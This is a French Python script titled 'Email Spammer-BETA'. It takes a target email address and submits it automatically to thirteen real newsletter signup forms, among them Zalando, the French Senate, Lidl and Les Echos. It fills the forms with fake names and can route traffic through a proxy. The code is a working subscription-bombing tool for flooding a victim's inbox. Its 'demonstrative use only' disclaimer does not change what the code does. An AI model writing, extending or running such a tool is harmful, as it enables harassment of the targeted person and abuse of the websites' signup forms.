# Email Spammer-BETA
# Développé par Nico Isapro 
# Déstiné à un usage démonstratif uniquement


# ----------------------------------------------------#
#                            TODO                          #
# ----------------------------------------------------#

# Faire un deuxieme fichier contenant les servers de newsletter; ce sera plus simple pour les modifier par la suite
# Mettre en place la connection proxy, actuellement ça check juste si le proxy résulte un code 200 ou non
# Arranger un peu le bordel des forms post, trouver un moyen qu'on puisse ctrl c + v les champs depuis Tamper par ex. 
# Ajouter des servers newsletter
# Tester sur le long terme l'effet sur une adresse mail propre



# ----------------------------------------------------#
#                      IMPORTATION                    #
# ----------------------------------------------------#

import sys
import os
import requests 
import time
import os.path
import re

# ----------------------------------------------------#
#                      EN TETE DOS                     #
# ----------------------------------------------------#

os.system('cls')                # Clear DOS
os.system('color B')         #Couleur bleu au DOS

print ("")  
print ("  _   _   _                    ___                                      ")                                                                                       
print (" | \ | | (_)   ___    ___     |_ _|  ___    __ _   _ __    _ __    ___  ")                                                                                            
print (" |  \| | | |  / __|  / _ \     | |  / __|  / _` | | '_ \  | '__|  / _ \ ")                                                                                            
print (" | |\  | | | | (__  | (_) |    | |  \__ \ | (_| | | |_) | | |    | (_) |")                                                                                            
print (" |_| \_| |_|  \___|  \___/    |___| |___/  \__,_| | .__/  |_|     \___/")   
print ("                                                  |_|                  ") 
print ("")  
print ("                           Email Spammer Version Beta                ")     
print ("")          

# ----------------------------------------------------#
#              PARTIE CONNECTION                  #
# ----------------------------------------------------#

proxf = "proxy.dat"        # Fichier proxy
filexist = os.path.isfile(proxf) 

if filexist == True:
 demande =  input("Use Proxy ? (Y/N) : ")
 print()
else : 
 demande = False 

if demande=="Y" or demande == "y":
 file = open(proxf,'r') 
 proxfound = file.readline() 
 print ("Vérification du proxy : " +proxfound + " en cours... \n")
 proxies = {'http': 'http://'+proxfound+'/'}
 try :
  requests.get('http://google.fr', proxies=proxies)
 except IOError:
    print ("Fail, bad proxy \n ")
    exit()
 else:
    print ("Proxy OK [CODE 200] \n")
	
if demande == "N" or demande == "n":
  print ("Test de connexion normal en cours... \n")	
  try :
   requests.get('http://google.fr')
  except IOError:
    print ("Fail, bad connexion \n ")
  else:
    print ("Connexion OK [CODE 200] \n")	
mail =  input("Email a spam : ")
match = re.match('^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', mail)
if match == None:
  print('Mauvaise syntaxe')
  exit()
else:
  print ("Email OK \n") 
  
print("Interrogation et inscription des serveurs de spam \n")  

# ----------------------------------------------------#
#              PARTIE INSCRIPTION                  #
# ----------------------------------------------------#

url1 = "http://www.points.fr/inscription-newsletter.html"
payload1 = {
    'email': mail,
    'nom':'',
    'prenom':'',
    'submit':"S'inscrire",
    'todo':'add'
    }
postinfo1 = requests.post(url1,data=payload1)
code1 = postinfo1.status_code	 

if code1 == 200:
  print("Serveur 1 OK \n")  
else: 
       print ("Erreur Serveur 1 \n")

url2 = "http://www.tati.fr/newsletter.php"
payload2 = {
    'act':'add',
    'newsletterDatenaisA':'1992',
    'newsletterDatenaisJ':'09',
    'newsletterDatenaisM':'12',
    'newsletterFront':'',
    'newsletterMail':mail,
    'newsletterMailv':mail,
    'newsletterNom':'michel',
    'newsletterPrenom':'michel',
    'newsletterSexe':'M' 
    }
postinfo2 = requests.post(url2,data=payload2)
code2 = postinfo2.status_code	 

if code2 == 200:
  print("Serveur 2 OK \n")
else: 
       print ("Erreur Serveur 2 \n")
  

url3 = "https://www.zalando.fr/newsletter/subscriber/new/"
payload3 = {
    'email': mail,
    "subscribeMale":"&wt_form=1"
    }
postinfo3 = requests.post(url3,data=payload3)
code3 = postinfo3.status_code	 

if code3 == 200:
  print("Serveur 3 OK \n")
else: 
       print ("Erreur Serveur 3 \n")
  

url4 = "https://www.lesechos.fr/acces/php/inscription_ajax2015.php"
payload4 = {
      "civilite":"M",
      "formulaire_origine":"echos",
      "go":"S'inscrire%20aux%20newsletters",
      "mail":mail,
      "mot_de_passe":"groscaca",
      "nom":"michel",
      "origine_mailing":"",
      "prenom":"michel"
 }
postinfo4 = requests.post(url4,data=payload4)
code4 = postinfo4.status_code	 

if code4 == 200:
  print("Serveur 4 OK \n")
else: 
       print ("Erreur Serveur 4 \n")
  
url5 = "http://www.senat.fr/newsletter/senat_lettre/Abonnement_Inscrire_action.php"
payload5 = {
      "completequotidienne":"completeQ", 
      "email":mail,
      "format":"html",
      "liste":"lettre",
      "mdp":"encode",
      "theme-quotidienne-%5B%5D":"1",
      "theme-quotidienne-%5B%5D":"17",
      "theme-quotidienne-%5B%5D":"2",
      "theme-quotidienne-%5B%5D":"18",
      "theme-quotidienne-%5B%5D":"3",
      "theme-quotidienne-%5B%5D":"19",
      "theme-quotidienne-%5B%5D":"4",
      "theme-quotidienne-%5B%5D":"20",
      "theme-quotidienne-%5B%5D":"5",
      "theme-quotidienne-%5B%5D":"21",
      "theme-quotidienne-%5B%5D":"6",
      "theme-quotidienne-%5B%5D":"22",
      "theme-quotidienne-%5B%5D":"7",
      "theme-quotidienne-%5B%5D":"23",
      "theme-quotidienne-%5B%5D":"8",
      "theme-quotidienne-%5B%5D":"24",
      "theme-quotidienne-%5B%5D":"9",
      "theme-quotidienne-%5B%5D":"25",
      "theme-quotidienne-%5B%5D":"10",
      "theme-quotidienne-%5B%5D":"26",
      "theme-quotidienne-%5B%5D":"11",
      "theme-quotidienne-%5B%5D":"27",
      "theme-quotidienne-%5B%5D":"12",
      "theme-quotidienne-%5B%5D":"28",
      "theme-quotidienne-%5B%5D":"13",
      "theme-quotidienne-%5B%5D":"29",
      "theme-quotidienne-%5B%5D":"14",
      "theme-quotidienne-%5B%5D":"30",
      "theme-quotidienne-%5B%5D":"15",
      "theme-quotidienne-%5B%5D":"31",
      "theme-quotidienne-%5B%5D":"16",
      "theme-quotidienne-%5B%5D":"63"
 }
postinfo5 = requests.post(url5,data=payload5)
code5 = postinfo5.status_code	 

if code5 == 200:
  print("Serveur 5 OK \n")
else: 
       print ("Erreur Serveur 5 \n")
  
url6 = "http://www.hbrfrance.fr/inscription-a-la-newsletter/"
payload6 = {
      "gform_field_values":"", 
      "gform_source_page_number_1":"1",
      "gform_target_page_number_1":"0",
      "gform_unique_id":"",
      "input_3":mail,
      "input_4.1":"1",
      "input_5.1":"1",
      "is_submit_1":"1",
      "state_1":"WyJbXSIsImVjNzcyOTJhMjA3YzYwMmJjN2E4NWZkMTBmMDExNGEyIl0="
 }
postinfo6 = requests.post(url6,data=payload6)
code6 = postinfo6.status_code	 

if code6 == 200:
  print("Serveur 6 OK \n")
else: 
       print ("Erreur Serveur 6 \n")  
  
  
url7 = "http://www.ladefense.fr/fr/inscription-la-newsletter"
payload7 = {
      "news_mail":mail, 
      "sub_news":"ok"
 }
postinfo7 = requests.post(url7,data=payload7)
code7 = postinfo7.status_code	 

if code7 == 200:
  print("Serveur 7 OK \n")
else: 
       print ("Erreur Serveur 7 \n")  

url8 = "http://www.journaldefrancois.fr/newsletter-inscription.htm"
payload8 = {
      "mail":mail, 
      "nom":"",
      "prenom":"",
      "type":"inscription"
 }
postinfo8 = requests.post(url8,data=payload8)
code8 = postinfo8.status_code	 

if code8 == 200:
  print("Serveur 8 OK \n")
else: 
       print ("Erreur Serveur 8 \n")  

url9 = "https://web.inxmail.com/wolford/subscription/servlet"
payload9 = {
      "Anrede":"Mr", 
      "INXMAIL_HTTP_REDIRECT":"https://www.wolfordshop.fr/newsletter.html?subscribeSuccess=true", 
      "INXMAIL_HTTP_REDIRECT_ERROR":"https://www.wolfordshop.fr/newsletter.html?subscribeSuccess=false",
      "INXMAIL_SUBSCRIPTION":"Wolford%20Shop%20France",
      "Nachname":"",
      "Vorname":"",
      "email":mail,
      "newsletteraccept":"accepted"
 }
postinfo9 = requests.post(url9,data=payload9)
code9 = postinfo9.status_code	 

if code9 == 200:
  print("Serveur 9 OK \n")
else: 
       print ("Erreur Serveur 9 \n")  
   	      	   
url10 = "http://www.huffingtonpost.fr/newsletter-signup/"
payload10 = {
      "email":mail,
      "slug":"france"
 }
postinfo10 = requests.post(url10,data=payload10)
code10 = postinfo10.status_code	 

if code10 == 200:
  print("Serveur 10 OK \n")
else: 
       print ("Erreur Serveur 10 \n")  
   	      	   
url11 = "http://www.gamalive.com/traitement-mailing"
payload11 = {
      "email":mail,
      "mailing":"1"
 }
postinfo11 = requests.post(url11,data=payload11)
code11 = postinfo11.status_code	 

if code11 == 200:
  print("Serveur 11 OK \n")
else: 
       print ("Erreur Serveur 11 \n")  

url12 = "http://france3-regions.francetvinfo.fr/abonnements/php/abonnement/abonnement.php"
payload12 = {
      "email":mail,
      "optin":"ftvOptFtv"
 }
postinfo12 = requests.post(url12,data=payload12)
code12 = postinfo12.status_code	 

if code12 == 200:
  print("Serveur 12 OK \n")
else: 
       print ("Erreur Serveur 12 \n")  
   	 	   
url13 = "https://form.lidl.com/formcycle/form/process/1661/current/?lang=fr-FR&frid=fd71dd10-1a98-4e5b-aa92-413d216ceef8"
payload13 = {
      "Anrede":"%20",
      "EMail":mail,
      "Nachname":"",
      "Vorname":"",
      "birthdate":"",
      "birthdate_shown":"",
      "xf-action":"sendbtn",
      "xfc-pp-elementslist":"Anrede,Vorname,Nachname,EMail,birthdate_shown,birthdate",
      "xima-9875-required":""
 }
postinfo13 = requests.post(url13,data=payload13)
code13 = postinfo13.status_code	 

if code13 == 200:
  print("Serveur 13 OK \n")
else: 
       print ("Erreur Serveur 13 \n")  
   	 	   	   
exit()
